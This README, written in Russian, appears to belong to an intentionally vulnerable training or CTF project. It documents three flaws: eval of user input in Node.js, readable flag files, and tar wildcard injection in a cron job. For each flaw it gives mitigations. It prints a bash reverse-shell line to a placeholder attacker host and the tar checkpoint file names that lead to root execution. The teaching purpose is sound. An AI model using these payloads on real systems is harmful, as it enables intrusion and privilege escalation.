# 🔒 Уязвимости и способы защиты

В данном проекте реализованы несколько уязвимостей, каждая из которых может быть использована злоумышленником для получения несанкционированного доступа или повышения привилегий. Ниже приведено их описание и рекомендации по защите.

---

## 1. Использование небезопасного `eval` в Node.js

### 📌 Описание
Во Flask-приложении пользовательский ввод передаётся в команду `node -e`, где выполняется через `eval()`. Это позволяет выполнять произвольный JavaScript-код.

### ☠️ Потенциальная атака
Атакующий может выполнить команду, например, для получения обратной оболочки:

```javascript
require('child_process').execSync('bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"')
```

### 🛡️ Защита
- Никогда не используйте `eval()` с внешним вводом.
- Используйте безопасные шаблонизаторы или библиотеки (например, `vm2` для sandboxing).
- Проверяйте и валидируйте ввод с помощью whitelisting.
- Используйте `Content Security Policy (CSP)`.

---

## 2. Хранение чувствительных данных и флагов в системе

### 📌 Описание
Секреты (флаги, подсказки) находятся в файловой системе в виде обычных файлов, доступных для чтения пользователем.

### ☠️ Потенциальная атака
Злоумышленник, получивший доступ к системе, может сразу прочитать содержимое этих файлов.

### 🛡️ Защита
- Используйте переменные окружения для хранения секретов.
- Ограничьте доступ к конфиденциальным файлам на уровне прав доступа (chmod/chown).
- Применяйте SELinux/AppArmor для изоляции.

---

## 3. Wildcard Injection через `tar` в cron

### 📌 Описание
Cron-задача каждую минуту архивирует содержимое `/var/logs/` с помощью команды `tar -czf logs-<timestamp>.tar *`. При этом не фильтруются специальные имена файлов.

### ☠️ Потенциальная атака
Атакующий может создать файлы:
```bash
--checkpoint=1
--checkpoint-action=exec=sh shell.sh
```
и добиться выполнения `shell.sh` с правами root.

### 🛡️ Защита
- Никогда не используйте `*` в чувствительных cron-скриптах.
- Используйте `--` для окончания списка параметров в `tar`, например:
  ```bash
  tar -czf logs.tar -- *
  ```
- Запускайте cron-скрипты в изолированных средах (например, контейнерах).
- Очищайте директории перед запуском архивирования.

---

## Общие рекомендации по защите

- Используйте **наименьшие привилегии** (principle of least privilege).
- Применяйте **контейнеризацию** и **sandboxing**.
- Настройте **аудит логов** и мониторинг подозрительной активности.
- Обновляйте зависимости и систему безопасности (патчи).
- Делайте **code review** и автоматизированное тестирование безопасности.
